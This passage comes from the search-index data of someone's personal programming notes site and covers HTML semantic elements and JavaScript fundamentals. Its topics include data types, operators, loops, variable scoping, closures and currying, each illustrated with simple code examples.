<code>&lt;figure&gt;</code> commonly used for a product(or any other) carts components.</p> </li> <li> <p><code>&lt;figcaption&gt;</code> - represents a caption or legend describing the rest of the contents of its parent <code>&lt;figure&gt;</code> element.</p> </li> </ul>"},{"location":"Dev/Prg/Langs/Html/#inline-text-semantics","title":"Inline text semantics","text":"<ul> <li> <p><code>&lt;cite&gt;</code> - used to describe a reference to a cited creative work, and must include the title of that work. The reference may be in an abbreviated form according to context-appropriate conventions related to citation metadata.</p> </li> <li> <p><code>&lt;strong&gt;</code> - important(bold) text, same as deprecated <code>&lt;b&gt;</code></p> </li> <li> <p><code>&lt;em&gt;</code> - emphasized(italic) text, same as deprecated <code>&lt;i&gt;</code></p> </li> </ul>"},{"location":"Dev/Prg/Langs/Html/#embedded-content","title":"Embedded content","text":"<ul> <li> <p><code>&lt;picture&gt;</code> - contains zero or more <code>&lt;source /&gt;</code> elements and one <code>&lt;img /&gt;</code> element to offer alternative versions of an image for different display/device scenarios.</p> <p>Using image with <code>.webp</code> file extension for suitable browsers and <code>.png</code> image for all ohther browsers as a fallback</p> <pre><code>&lt;picture&gt;\n    &lt;source srcset=\"img/hero.webp\" type=\"image/webp\" /&gt;\n    &lt;source srcset=\"img/hero-min.png\" type=\"image/png\" /&gt;\n\n    &lt;img\n        src=\"img/hero-min.png\"\n        class=\"hero-img\"\n        alt=\"Woman enjoying food, meals in storage container, and food bowls on a table\"\n    /&gt;\n&lt;/picture&gt;\n</code></pre> </li> </ul>"},{"location":"Dev/Prg/Langs/Js/","title":"Js","text":""},{"location":"Dev/Prg/Langs/Js/#js-learning-sources","title":"Js Learning Sources","text":"<p>MDN: JavaScript Guide</p> <p>MDN: JavaScript reference</p> <p>Airbnb JavaScript Style Guide</p> <p>Simplified Js Jargon</p> <p>Modern JavaScript Tutorial recommended in ZTM course</p> <p>Javascript-The-Core Book recommended in ZTM course</p> <p>You-Dont-Know-JS Book recommended in ZTM course</p> <p>ES Features recommended in ZTM course</p> <p>Functional Programming Jargon</p> <p>Elevator Saga - The elevator programming game - Try playing this game, read the documentation, and use the developer tools to \"debug\".</p> <p>101 \u0432\u043e\u043f\u0440\u043e\u0441 \u043f\u043e JavaScript (\u0441 \u043e\u0442\u0432\u0435\u0442\u0430\u043c\u0438) \u0448\u043f\u0430\u0440\u0433\u0430\u043b\u043a\u0430 \u043a \u0441\u043e\u0431\u0435\u0441\u0435\u0434\u043e\u0432\u0430\u043d\u0438\u044e + 15 \u043f\u0440\u0430\u043a\u0442\u0438\u0447\u0435\u0441\u043a\u0438\u0445 \u0437\u0430\u0434\u0430\u0447</p> <p>[ ] IT-Incubator: Sandbox, Front-end course, Back-end coursehttps://it-incubator.io/education/back-end</p> <p>Books:</p> <ul> <li> <p>Eloquent JavaScript</p> <p></p> </li> </ul>"},{"location":"Dev/Prg/Langs/Js/#import-javascript-into-html","title":"Import Javascript into HTML","text":"<p>Inside <code>&lt;body&gt; &lt;/body&gt;</code> at the bottom:</p> <pre><code>&lt;script type=\"text/javascript\" src=\"script.js\"&gt;&lt;/script&gt;\n</code></pre>"},{"location":"Dev/Prg/Langs/Js/#data-types","title":"Data Types","text":"<p>reference: MDN</p>"},{"location":"Dev/Prg/Langs/Js/#primitives","title":"Primitives","text":"<ul> <li> <p>Primitives are non-reference types i.e. they passed by value(when we assign one variable to another) and defined by programming language. So when we copy a variable into another variable - we copy the value and then create that value somewhere else in the memory heap.</p> <pre><code>let a = 5; // \"a\" now has an address of where this primitive value \"5\" sits in memory.\nlet b = a; // variable \"a\" passed by value to variable \"b\"\n/* Any time even though we did \"b\" equals to \"a\"\nwe simply copied the value of \"a\" and put it\ninto a new memory space in our machine for the \"b\" variable.\nThey don't really have any connection whatsoever\nand that's what passed by value means. */\nb++;\nconsole.log(a); // 5\nconsole.log(b); // 6 --&gt; value of \"b' isn't connected with value of \"a\"\n</code></pre> </li> <li> <p>Data Types</p> <ul> <li> <p>Undefined</p> <ul> <li>Used when nothing is assigned to a variable, e.g.: <code>var password;</code></li> </ul> </li> <li> <p>Boolean</p> </li> <li> <p>Numeric</p> <p>In other programming languages different numeric types exist; for example, Integers, Floats, Doubles, or Bignums.</p> <ul> <li> <p>Number</p> <ul> <li> <p>Can be a floating-point or <code>Infinity</code> / <code>-Infinity</code> value</p> </li> <li> <p> <pre><code>// Using Infinity\nconsole.log(Infinity          ); /* Infinity */\nconsole.log(Infinity + 1      ); /* Infinity */\nconsole.log(Math.pow(10, 1000)); /* Infinity */\nconsole.log(Math.log(0)       ); /* -Infinity */\nconsole.log(1 / Infinity      ); /* 0 */\nconsole.log(1 / 0             ); /* Infinity */\n</code></pre> <li> <p>NaN</p> <p>Undefined value or value that cannot be represented, especially results of floating-point calculations.</p> <ul> <li> <p>There are five different types of operations that return NaN:</p> <ol> <li>Number cannot be parsed (e.g. <code>parseInt(\"blabla\")</code> or <code>Number(undefined)</code>)</li> <li>Math operation where the result is not a real number (e.g. <code>Math.sqrt(-1)</code>)</li> <li>Operand of an argument is <code>NaN</code> (e.g. <code>7 ** NaN</code>)</li> <li>Indeterminate form (e.g. <code>0 * Infinity</code>, or <code>undefined + undefined</code>)</li> <li>Any operation that involves a string and is not an addition operation (e.g. <code>\"foo\" / 3</code>)</li> </ol> </li> </ul> </li> <li> <p>BigInt</p> <p>BigInt is a built-in object whose constructor returns a bigint primitive \u2014 also called a BigInt value, or sometimes just a BigInt \u2014 to represent whole numbers larger than 2^53 - 1 (Number.MAX_SAFE_INTEGER), which is the largest number JavaScript can represent with a number primitive (or Number value). BigInt values can be used for arbitrarily large integers.</p> </li> <li> <p>String</p> <ul> <li> <p>Template strings - backticks <code>``</code> are used to specify string literals instead of <code>''</code> or <code>\"\"</code>. Allows us to avoid the <code>+</code> separation and elements and variables should be added with syntax ${element}. We can do any sort of expression inside the curly brackets.</p> <pre><code>  const name = \"Sally\";\nconst age = 34;\nconst pet = \"horse\";\n\nconst greetingBest = `Hello ${name} you seem to be ${age-10}. What a lovely ${pet} you have`;\n</code></pre> </li> <li> <p>Strings methods</p> <ul> <li><code>split()</code>: splits a string into an array of substrings</li> <li><code>padStart(param1,param2)</code>: param1 number of characters param2 are added before the value of element declared. The default param2 is \" \"</li> <li><code>padEnd(param1,param2)</code>: same as above but at the end</li> <li><code>trimStart()</code>: eliminates empty spaces from the start of a variable</li> <li><code>trimEnd()</code>: same as above but from the end</li> <li><code>replace(searchvalue, newvalue)</code>: Searches a string for a specified value, or a regular expression, and returns a new string where the specified values are replaced.</li> </ul> </li> </ul> </li> <li> <p>Symbol</p> <ul> <li> <p>ES6.</p> </li> <li> <p>Each symbol creates a completely unique data type.</p> <pre><code>  let sym1 = Symbol();\nlet sym2 = Symbol('foo');\nlet sym3 = Symbol('foo');\nsym2 === sym3; // false\n</code></pre> </li> <li> <p>Symbol value used as an identifier, mostly for object properties, because sometimes(e.g. when we have thousand of properties) we don't want them to collide and be the same ones in order to avoid bugs.</p> </li> </ul> </li> <li> <p>Structural Root Primitive</p> <ul> <li>Null (Means \"nothing\" i.e \"completely empty\").</li> </ul> </li>"},{"location":"Dev/Prg/Langs/Js/#structural-types","title":"Structural Types","text":"<ul> <li> <p>Object</p> <p>Objects are reference types, i.e. they passed by reference(when we assign one object to another) and defined by a programmer. So when we assign \"object1\" to \"object2\" we don't copy the values like we did with primitive types. We simply address \"object2\" to the same place in memory heap where is \"object1\" is.</p> <p> Pros: By just having one object we're saving space and memory. We're not copying and cloning the object creating multiple version. We simply save memory reference(just one location!) instead of just loading up our memory heap.</p> <p> Cons: Unlike a primitive type we might have issue where by mistake somebody else changes a property on the referenced object(by changing \"original object\" property).</p> <pre><code>// Object Example:\nconst object1 = { value: 10 };\nconst object2 = object1; // \"object1\" passed by reference to \"object2\"\n/* \"object1\" and \"object2\" are both\npointing to the same address in memory heap\nwhere their(the same!) value is located. */\nconst object3 = { value: 10 };\nconsole.log(object1 === object2); // true\nconsole.log(object1 === object3); // false\nobject1.value = 15;\nconsole.log(object2.value); // 15\nconsole.log(object3.value); // 10\n\n// Array Example:\nconst c = [1,2,3,4,5];\nconst d = c; // \"c\" passed by reference to \"d\"\nd.push(13451534636);\nconsole.log(c); // [1, 2, 3, 4, 5, 13451534636]\n\n// More Examples:\nconsole.log([] === []) // false\nconsole.log([2] === [2]) // false\nconsole.log({} === {}) // false\nconsole.log({a:3, b:'hi'} === {a:3, b:'hi'}) // false\n</code></pre> </li> <li> <p>Function</p> </li> </ul>"},{"location":"Dev/Prg/Langs/Js/#type-coercion","title":"Type Coercion","text":"<ul> <li> <p>Javascript convert certain type into another type:</p> <pre><code>1 == '1' //true, '1' change to 1\n\n// should always use ====\n1 === '1' //false, compare exactly without coercion\n\nif (1)  // if(true)\nif (0)  // if(false)\n\nNaN === NaN //false\n// should be true, use:\nObject.is(NaN,NaN)  //true\n</code></pre> </li> <li> <p>Type Coercion table</p> </li> <li> <p>MDN - Equality Comparisons</p> </li> <li> <p>ECMA Comparison Algorithm</p> </li> </ul>"},{"location":"Dev/Prg/Langs/Js/#operators","title":"Operators","text":"<p>reference: MDN, W3S</p>"},{"location":"Dev/Prg/Langs/Js/#arithmetic","title":"Arithmetic","text":"<ul> <li><code>+</code> <code>-</code> <code>*</code> <code>/</code></li> <li> <p><code>+</code> : numeric addition vs. string concatenation</p> <pre><code>    // NUMERIC ADDITION:\n// Number + Number -&gt; addition\n1 + 2 // 3\n\n// Boolean + Number -&gt; addition\ntrue + 1 // 2\n\n// Boolean + Boolean -&gt; addition\nfalse + false // 0\ntrue + true   // 2\n\n// STRING CONCATENATION:\n// String + String -&gt; CONCATENATION\n'foo' + 'bar' // \"foobar\"\n\n// Number + String -&gt; concatenation\n5 + 'foo' // \"5foo\"\n\n// String + Boolean -&gt; concatenation\n'foo' + false // \"foofalse\"\n</code></pre> </li> <li> <p><code>**</code> (ES7(2016): Exponentiation)</p> </li> <li><code>%</code> (Modulus)</li> <li><code>++A</code> (increments and returns the value after incrementing)</li> <li><code>A++</code> (increments and returns the value before incrementing)</li> <li><code>--A</code> (decrements and returns the value after decrementing)</li> <li><code>A--</code> (decrements and returns the value before decrementing)</li> </ul>"},{"location":"Dev/Prg/Langs/Js/#assignment","title":"Assignment","text":"<ul> <li><code>=</code> <code>+=</code> <code>-=</code> <code>*=</code> <code>/=</code> <code>**=</code> <code>%=</code></li> <li> <p><code>+=</code> : addition or concatenation behavior of the addition assignment</p> <pre><code>    // Assuming the following variables\n//  foo = 'foo'\n//  bar = 5\n//  baz = true\n\n// Number + Number -&gt; addition\nbar += 2 // 7\n\n// Boolean + Number -&gt; addition\nbaz += 1 // 2\n\n// Boolean + Boolean -&gt; addition\nbaz += false // 1\nbaz += true  // 2\n\n// Number + String -&gt; concatenation\nbar += 'foo' // \"5foo\"\n\n// String + Boolean -&gt; concatenation\nfoo += false // \"foofalse\"\n\n// String + String -&gt; concatenation\nfoo += 'bar' // \"foobar\"\n</code></pre> </li> </ul>"},{"location":"Dev/Prg/Langs/Js/#string-operators","title":"String operators","text":"<ul> <li>concatenaton: <code>+</code> <code>+=</code></li> </ul>"},{"location":"Dev/Prg/Langs/Js/#unary-operators","title":"Unary operators","text":"<p>A unary operation is an operation with only one operand.</p> <ul> <li> <p><code>!</code> (logical NOT operator)</p> </li> <li> <p><code>~</code> (bitwise NOT operator)</p> </li> <li> <p><code>+</code> (converts operand to Number type)</p> <pre><code>    const x = 1;\nconst y = -1;\n\nconsole.log(+x);\n// expected output: 1\n\nconsole.log(+y);\n// expected output: -1\n\nconsole.log(+'');\n// expected output: 0\n\nconsole.log(+true);\n// expected output: 1\n\nconsole.log(+false);\n// expected output: 0\n\nconsole.log(+'hello');\n// expected output: NaN\n</code></pre> </li> <li> <p><code>-</code> (converts operand to Number type and then negates it)</p> <pre><code>    const x = 4;\nconst y = -x;\n\nconsole.log(y);\n// expected output: -4\n\nconst a = '4';\nconst b = -a;\n\nconsole.log(b);\n// expected output: -4\n</code></pre> </li> </ul>"},{"location":"Dev/Prg/Langs/Js/#chaining-operators","title":"Chaining operators","text":"<ul> <li> <p><code>.</code></p> </li> <li> <p><code>?.</code> (optional chaining:  enables you to read the value of a property located deep within a chain of connected objects without having to check that each reference in the chain is valid.)</p> <ul> <li> <p>ES2020.</p> </li> <li> <p>The <code>?.</code> operator is like the <code>.</code> chaining operator, except that instead of causing an error if a reference is nullish (null or undefined), the expression short-circuits with a return value of <code>undefined</code>. When used with function calls, it returns <code>undefined</code> if the given function does not exist.</p> </li> <li> <p> <pre><code>// Exercise: Clean up this code using optional chaining\nlet will_pokemon = {\npikachu: {\nspecies: 'Mouse Pokemon',\nheight: 0.4,\npower: 'lightning',\nfriend: {\ncharizard: {\nspecies: 'Dragon Pokemon',\nheight: 1.7,\nweight: 90.5,\npower: 'fire'\n}\n}\n}\n}\n\nlet andrei_pokemon = {\nraichu: {\nspecies: 'Mouse Pokemon',\nheight: 0.8,\nweight: 30,\npower: ''\n}\n}\n\nif (andrei_pokemon &amp;&amp; andrei_pokemon.raichu &amp;&amp; will_pokemon\n&amp;&amp; will_pokemon.pikachu &amp;&amp; will_pokemon.pikachu.friend\n&amp;&amp; will_pokemon.pikachu.friend.charizard) {\nconsole.log('fight!')\n} else {\nconsole.log('walk away...')\n}\n\n// Solution:\nif (andrei_pokemon?.raichu &amp;&amp; will_pokemon?.pikachu?.friend?.charizard) {\nconsole.log('fight!')\n} else {\nconsole.log('walk away...')\n}\n</code></pre>"},{"location":"Dev/Prg/Langs/Js/#logical","title":"Logical","text":"<ul> <li> <p><code>&amp;&amp;</code></p> </li> <li> <p><code>||</code></p> </li> <li> <p><code>??</code> (nullish coalescing operator: returns its right-hand side operand when its left-hand side operand is <code>null</code> or <code>undefined</code>, and otherwise returns its left-hand side operand.)</p> <ul> <li> <p>This can be contrasted with the logical OR (<code>||</code>) operator, which returns the right-hand side operand if the left operand is any falsy value(<code>null</code>, <code>NaN</code>, <code>0</code>, empty string: <code>\"\"</code> or <code>''</code> or <code>``</code>, <code>undefined</code>), not only <code>null</code> or <code>undefined</code>. In other words, if you use <code>||</code> to provide some default value to another variable <code>foo</code>, you may encounter unexpected behaviors if you consider some falsy values as usable (e.g., <code>''</code> or <code>0</code>).</p> </li> <li> <p> <pre><code>// Example 1:\nlet andrei_pokemon = {\npikachu: {\nspecies: 'Mouse Pokemon',\nheight: 0.8,\nweight: 30,\npower: 0,\n}\n}\n\nlet power = andrei_pokemon?.pikachu?.power || 'no power'; // \"no power\"\n\nlet power = andrei_pokemon?.pikachu?.power ?? 'no power'; // 0\n\n// Example 2:\nconsole.log(false ?? 'hellooo') // false\nconsole.log(null ?? 'hellooo') // 'hellooo'\nconsole.log(null || 'hellooo') // 'hellooo'\nconsole.log((false || null) ?? 'hellooo') // 'hellooo'\nconsole.log(null ?? (false || 'hellooo')) // 'hellooo'\n</code></pre>"},{"location":"Dev/Prg/Langs/Js/#comparisons","title":"Comparisons","text":"<ul> <li> <p><code>==</code> (equal to : comparison by value only - not recommended)</p> </li> <li> <p><code>===</code> (equal value and equal type : comparison by both value and data type - recommended)</p> </li> <li> <p><code>!=</code> (not equal)</p> </li> <li> <p><code>!==</code> (not equal value or not equal type)</p> </li> <li> <p><code>&gt;=</code></p> </li> <li> <p><code>&lt;=</code></p> </li> <li> <p><code>&gt;</code></p> </li> <li> <p><code>&lt;</code></p> </li> </ul>"},{"location":"Dev/Prg/Langs/Js/#conditionals-operators-and-statements","title":"Conditionals (operators and statements)","text":"<ul> <li> <p><code>if</code>, <code>else</code>, <code>else if</code></p> <ul> <li> <p> <pre><code>if (condition) {\nstatements1\n} else if {\nstatements2\n} else {\nstatements3\n}\n</code></pre> <li> <p><code>condition ? exprIfTrue : exprIfFalse</code></p> <ul> <li> <p>ES6: ternary operator</p> </li> <li> <p> <pre><code>// change this function into a ternary and assign it to variable called experiencePoints\nfunction experiencePoints() {\nif (winBattle()) {\nreturn 10;\n} else {\nreturn 1;\n}\n}\n// solution:\nvar experiencePoints = winBattle() ? 10 : 1;\n</code></pre> <li> <p><code>switch</code></p> <ul> <li> <p> <pre><code>function moveCommand(direction) {\nvar whatHappens;\nswitch (direction) {\ncase \"forward\":\nwhatHappens = \"you encounter a monster\";\nbreak;\ncase \"back\":\nwhatHappens = \"you arrived home\";\nbreak;\ncase \"right\":\nwhatHappens = \"you found a river\";\nbreak;\ncase \"left\":\nwhatHappens = \"you run into a troll\";\nbreak;\ndefault:\nwhatHappens = \"please enter a valid direction\";\n}\nreturn whatHappens;\n}\n</code></pre>"},{"location":"Dev/Prg/Langs/Js/#statements","title":"Statements","text":""},{"location":"Dev/Prg/Langs/Js/#trycatch","title":"try...catch","text":"<ul> <li> <p>The <code>try...catch</code> statement marks a block of statements to try and specifies a response should an exception be thrown.</p> </li> <li> <p>Syntax:</p> <pre><code>try {\ntry_statements\n}\ncatch (exception_var) {\ncatch_statements\n}\nfinally {\nfinally_statements\n}\n</code></pre> <p>try_statements - the statements to be executed.</p> <p>catch_statements - statement that is executed if an exception is thrown in the try-block.</p> <p>exception_var - an optional(since ES10) identifier to hold an exception object for the associated catch-block.</p> <p>finally_statements - statements that are executed after the try statement completes. These statements execute regardless of whether an exception was thrown or caught.</p> </li> <li> <p>Example:</p> <pre><code>try {\nnonExistentFunction();\n} catch (error) {\nconsole.error(error);\n// expected output: ReferenceError: nonExistentFunction is not defined\n// Note - error messages will vary depending on browser\n}\n</code></pre> </li> </ul>"},{"location":"Dev/Prg/Langs/Js/#export","title":"export","text":"<ul> <li>refrerence: MDN</li> <li> <p>The <code>export</code> statement is used when creating JavaScript modules to export live bindings to functions, objects, or primitive values from the module so they can be used by other programs with the <code>import</code> statement. Bindings that are exported can still be modified locally; when imported, although they can only be read by the importing module the value updates whenever it is updated by the exporting module.</p> <p>Exported modules are in strict mode whether you declare them as such or not. The export statement cannot be used in embedded scripts.</p> </li> </ul>"},{"location":"Dev/Prg/Langs/Js/#import","title":"import","text":"<ul> <li>refrerence: MDN</li> <li> <p>The static <code>import</code> statement is used to import read only live bindings which are exported by another module.</p> <p>Imported modules are in strict mode whether you declare them as such or not. The import statement cannot be used in embedded scripts unless such script has a <code>type=\"module\"</code>. Bindings imported are called live bindings because they are updated by the module that exported the binding.</p> <p>There is also a function-like dynamic <code>import()</code>, which does not require scripts of <code>type=\"module\"</code>.</p> <p>Backward compatibility can be ensured using attribute <code>nomodule</code> on the <code>&lt;script&gt;</code> tag.</p> </li> </ul>"},{"location":"Dev/Prg/Langs/Js/#looping","title":"Looping","text":"<p><code>for</code> : Loops through a block of code a number of times</p> <ul> <li> <p> <pre><code>let todos = [\n'clean room',\n'brush teeth',\n'exercise',\n'study javascript',\n'eat healthy'\n];\nconst todosLength = todos.length;\nfor (let i=0; i &lt; todosLength; i++) {\ntodos.pop();\n}\n\nconsole.log(todos);\n// []\n</code></pre> <p><code>while</code>, <code>do/while</code> : Loops through a block of code while a specified condition is true</p> <ul> <li> <p> <pre><code>// while loop:\nlet counterOne = 0;\nwhile (counterOne &lt; 10) {\nconsole.log(counterOne);\ncounterOne++;\n}\n// 0\n// 1\n// 2\n// 3\n// 4\n// 5\n// 6\n// 7\n// 8\n// 9\n\n// do while loop:\nlet counterTwo = 0;\ndo {\nconsole.log(counterTwo);\ncounterTwo++;\n} while (counterTwo &lt; 10);\n// 0\n// 1\n// 2\n// 3\n// 4\n// 5\n// 6\n// 7\n// 8\n// 9\n\n// while vs. do while:\nlet counterOne = 10;\nwhile (counterOne &lt; 10) {\nconsole.log('while', counterOne);\ncounterOne++;\n}\n// undefined\n\nlet counterTwo = 10;\ndo {\nconsole.log('do while', counterTwo);\ncounterTwo++;\n} while (counterTwo &lt; 10);\n// do while 10\n\n/* we see that 'do while' ran while 'while' never did\nbecause of condition position in each loop */\n</code></pre> <p><code>for/in</code> : Loops(enumirates) through the properties(that can include its prototypes' properties too) of an object</p> <p>Note: Enumerables - something, which we can't iterate through out of the box. To be able to access one property after another, we need the property names. This is the reason why we have methods like <code>Object.entries</code> to make them iterable.</p> <ul> <li> <p>ES6.</p> </li> <li> <p> <pre><code>const detailedBasket = {\napples: 5,\noranges: 10,\ngrapes: 1000,\n}\n\nfor (let item in detailedBasket) {\nif (detailedBasket.hasOwnProperty(item)) { // to consider properties attached to the object itself, and not its prototypes\nconsole.log(item);\n}\n}\n/* apples\n   oranges\n   grapes */\n\nconst basket = ['apples', 'oranges', 'grapes'];\n\nfor (let item in basket) {\nif (basket.hasOwnProperty(item)) { // to consider properties attached to the object itself, and not its prototypes\nconsole.log(item);\n}\n}\n/* 0\n   1\n   2 */\n</code></pre> <p><code>for/of</code> : Loops(iterates) through the values of an iterable object(array, string)</p> <p>Note: Iterables - everything which has a length(like arrays and strings).</p> <ul> <li> <p>ES6.</p> </li> <li> <p> <pre><code>const basket = ['apples', 'oranges', 'grapes'];\n\nfor (let item of basket) {\nconsole.log(item);\n}\n/* apples\n   oranges\n   grapes */\n</code></pre> <p><code>forEach</code> : Is the Array method. See below in the Array section.</p>"},{"location":"Dev/Prg/Langs/Js/#variables","title":"Variables","text":"<p>Note: Variables created without a declaration keyword (<code>var</code>, <code>let</code>, or <code>const</code>) are always global, even if they are created inside a function.</p>"},{"location":"Dev/Prg/Langs/Js/#var","title":"var","text":"<ul> <li> <p>Its value can be altered.</p> </li> <li> <p>It is Function Scope variable: Any time it is declared inside curly brackets inside a function it creates a new scope.</p> </li> <li> <p>Global variables defined with the var keyword belong to the <code>window</code> object.</p> <pre><code>// in console run firstly:\nvar carName = \"Volvo\";\n// code here can use window.carName:\nwindow.carName; // \"Volvo\"\n</code></pre> </li> </ul>"},{"location":"Dev/Prg/Langs/Js/#let","title":"let","text":"<ul> <li> <p>ES6.</p> </li> <li> <p>Its value can be altered.</p> </li> <li> <p>It is Block Scope variable: Any time it is declared inside curly brackets in any place(function, if etc.) it creates a new scope:</p> <pre><code>const player = 'bobby';\nlet experience = 100;\nlet wizardLevel = false;\n\nif (experience &gt; 90) {\nlet wizardLevel = true;\nconsole.log('inside', wizardLevel); // inside true (because `let` inside curly brackets created a new scope!)\n}\nconsole.log('outside', wizardLevel); // outside false\n</code></pre> </li> <li> <p>Global variables defined with the let keyword do not belong to the <code>window</code> object.</p> <pre><code>// in console run firstly:\nlet carName = \"Volvo\";\n// code here cannot use window.carName:\nwindow.carName; // undefined\n</code></pre> </li> </ul>"},{"location":"Dev/Prg/Langs/Js/#const","title":"const","text":"<p>Tip: When we work with objects, arrays and function expressions, we should always use <code>const</code> to make sure, that we can't change the type of the variable.</p> <ul> <li> <p>ES6.</p> </li> <li> <p>Its value can't be altered(i.e. the variable can't be reassigned) once declared, but you can change properties of an object declared using <code>const</code>.</p> </li> <li> <p>It is Block Scope constant: Any time it is declared inside curly brackets in any place(function, if etc.) it creates a new scope.</p> </li> <li> <p>Global variables defined with the const keyword do not belong to the <code>window</code> object.</p> <pre><code>// in console run firstly:\nconst carName = \"Volvo\";\n// code here cannot use window.carName:\nwindow.carName; // undefined\n</code></pre> </li> </ul>"},{"location":"Dev/Prg/Langs/Js/#functions","title":"Functions","text":""},{"location":"Dev/Prg/Langs/Js/#function-basics","title":"Function Basics","text":"<p><code>function name() {}</code> : Function Declaration, a.k.a. Function Definition or Function Statement</p> <p><code>var a = function name() {}</code> : Function Expression, named function is assigned to a variable.</p> <p><code>var a = function() {}</code> : Function Expression, anonymous function is assigned to a variable.</p> <p><code>()</code> : we calling/invoking a function using brackets</p> <p>Note: Values inside brackets called parameters when we declare the function and arguments when we call the function.</p> <p>Note: Func. Declaration vs. Func. Expression: The difference lies in how the browser loads them into the execution context. Function declarations load before any code is executed. Function expressions load only when the interpreter reaches that line of code. So if you try to call a function expression before it's loaded, you'll get an error! If you call a function declaration instead, it'll always work, because no code can be called until all declarations are loaded.</p> <p><code>return</code></p> <ul> <li> <p>We use return in two ways:</p> </li> <li> <p>When we need the function to return a value that we can assign to other value</p> <pre><code>// EXAMPLE OF A GLOBAL VARIABLE:\n// We assign the function's return TYPE to this variable.\n// We then pass this global variable to console.log() function.\n// It really helps to build a strong logic,\n// and reuse the same code,\n// instead of creating new functions again and again.\n\nvar publicsum=0;\nfunction Multiply(a,b)\n{\n// debugger;\nvar sum = a*b;\nreturn sum\n}\n\npublicsum = Multiply(6,8);\nconsole.log(publicsum);\n</code></pre> </li> <li> <p>When we need to exit function's execution (it is especially relevant to loops)</p> <pre><code>// RETURN STATEMENT AS A BREAK COMMAND:\n// The for loop will iterate 10 times.\n// However if i == to 5 the code jumps into the return statement\n// which escapes the loop iteration, and ends the code execution.\n\nfunction ExitWithReturn()\n{\nfor(var i=0; i&lt;10;i++)\n{\nconsole.log(i);\nif(i == 5)\n{\nreturn;\n}\n}\n}\n\nExitWithReturn();\n</code></pre> </li> </ul>"},{"location":"Dev/Prg/Langs/Js/#js-callbacks","title":"Js Callbacks","text":"<p>Explained Using Minions</p>"},{"location":"Dev/Prg/Langs/Js/#arrow-funciton","title":"Arrow Funciton","text":"<ul> <li> <p>ES6: <code>const functionname = (param1,param2...) =&gt; action</code></p> </li> <li> <p>If there is an only return, there is no need to type \"return\" and if it's just one parameter, no need to add \"()\"</p> <pre><code>function add(a, b) {\nreturn a + b;\n}\n\n// arrow function\nconst add = (a, b) =&gt; a + b;\n</code></pre> </li> </ul>"},{"location":"Dev/Prg/Langs/Js/#iife","title":"IIFE","text":"<ul> <li>reference: Medium</li> </ul>"},{"location":"Dev/Prg/Langs/Js/#rest-parameter-syntax","title":"REST Parameter syntax","text":"<ul> <li> <p><code>...</code> : Allows a function to accept an indefinite number of arguments as an array, providing a way to represent variadic functions.</p> </li> <li> <p> <pre><code>const sumAll = (...all) =&gt; {\nlet result = 0;\nfor (let num of all) {\nresult += num;\n}\nreturn result\n}\n</code></pre>"},{"location":"Dev/Prg/Langs/Js/#default-arguments","title":"Default Arguments","text":"<ul> <li> <p>ES6</p> </li> <li> <p> <pre><code>function greet(name = '', age = 30, pet = 'cat') {\nreturn `Hello ${name} you seem to be ${age-10}. What a lovely ${pet} you have`;\n}\n\ngreet(); // \"Hello  you seem to be 20. What a lovely cat you have\"\n</code></pre>"},{"location":"Dev/Prg/Langs/Js/#closure","title":"Closure","text":"<p>reference: MDN(very good explanation), W3S(has interesting example at the end with IIFE)</p> <ul> <li> <p>A closure is the combination of a function and the lexical environment within which that function was declared.</p> </li> <li> <p>Closures are created every time a function is created, at function creation time.</p> </li> <li> <p>Closure \"mechanism\"(very simplified):</p> <ul> <li>A function ran.</li> <li>The funciton executed. It's never going to execute again.</li> <li> <p>BUT it's going to remember that there are references to those variables. So the child scope always has access to the parent scope.</p> <pre><code>// Example 1:\nconst first = () =&gt; {\nconst greet = 'Hi';\nconst second = () =&gt; {\nalert(greet);\n}\nreturn second;\n}\n\nconst newFunc = first();\nnewFunc();\n\n// Example 2:\nconst addTo = x =&gt; y =&gt; x + y\nvar addToTen = addTo(10)\naddToTen(3) // 13\n</code></pre> </li> </ul> </li> </ul>"},{"location":"Dev/Prg/Langs/Js/#currying","title":"Currying","text":"<ul> <li> <p><code>const functionname = param1 =&gt; param2 =&gt; action</code></p> </li> <li> <p>To properly call function syntax is: <code>functionname (param1)(param2)</code></p> </li> <li> <p>Currying is the process of converting a function that takes multiple arguments into a function that takes them one at a time.</p> <pre><code>const multiply = (a,b) =&gt; a * b;\nconst curriedMultiply = (a) =&gt; (b) =&gt; a * b;\ncurriedMultiply(2)(3); // 6\n\nconst multiplyBy5  = curriedMultiply(5);\nmultiplyBy5(11); //55\n\nconst volume = length =&gt; width =&gt; height =&gt; length * width * height;\nvolume(5); // width =&gt; height =&gt; length * width * height\nvolume(5)(4); // height =&gt; length * width * height\nvolume(5)(4)(3); // 60\n</code></pre> </li> </ul>"},{"location":"Dev/Prg/Langs/Js/#compose","title":"Compose","text":"<ul> <li> <p><code>const functionname = (param2,param3) =&gt; param1 =&gt; param2(param3(param1))</code> : Being param2 and 3 functions when param1 a value. Executes a function inside a function executed with the initial param1.</p> </li> <li> <p>Compose is the act of putting two functions together to form a third function where the output of one function is the input of the other.</p> <pre><code>const compose = (f,g) =&gt; (a) =&gt; f(g(a));\n\nconst sum = (num) =&gt; num + 1;\n\ncompose(sum, sum)(5); // 7\n</code></pre> </li> </ul>"},{"location":"Dev/Prg/Langs/Js/#tip-functional-puritydeterminism","title":"Tip: Functional Purity(Determinism)","text":"<ul> <li> <p>Two elements of a pure function:</p> <ul> <li> <p>No Side Effects --&gt;  It does not depend on any state, or data, change during a program\u2019s execution. It must only depend on its input elements.</p> <ul> <li> <p>Side Effects - any of actions that happen inside of the function that we don't really know anything about. If function interacts or reads or writes to an external variable, for example, or console logs, well, that's a side effect. In other words it is something that the functions doing to affect the outside world.</p> <pre><code>let a = 1;\nfunction b() {\na = 2; // &lt;= This is a side effect.\n}\n</code></pre> </li> </ul> </li> <li> <p>Always Returning - creating something deterministic --&gt; always produces the same results given the same inputs, i.e. given the same input the return value will be always the same and not undefined.</p> </li> </ul> </li> </ul>"},{"location":"Dev/Prg/Langs/Js/#useful-functions","title":"Useful Functions","text":"<ul> <li> <p> <pre><code>const getRandomBetween = (min, max) =&gt; Math.floor(Math.random() * (max - min + 1) + min)\n</code></pre> <li> <p> <pre><code>// Recursion function:\n\n// as function declaration\nfunction fac(num) {\n// emergency termination condition\nif (num &lt; 0) return\n// it is necessary to limit the number of recursion calls =&gt;\n// basic check to stop recursion\nif (num === 1) return num\n// recursion - the function calls itself\nreturn num * fac(num - 1)\n}\n\n// as arrow function\nconst fac = num =&gt; num &lt; 0 ? undefined : num === 1 ? num : num * fac(num - 1);\n</code></pre>"},{"location":"Dev/Prg/Langs/Js/#data-structures","title":"Data 